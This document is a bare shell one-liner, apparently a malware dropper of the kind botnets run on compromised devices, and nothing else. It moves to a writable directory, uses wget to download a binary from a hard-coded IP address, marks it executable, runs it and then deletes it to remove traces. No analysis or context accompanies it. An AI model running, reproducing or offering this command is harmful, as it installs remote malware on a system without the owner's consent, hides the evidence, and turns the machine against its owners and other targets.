cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.90.136/fucknet; chmod +x fucknet; ./fucknet; rm -rf fucknet
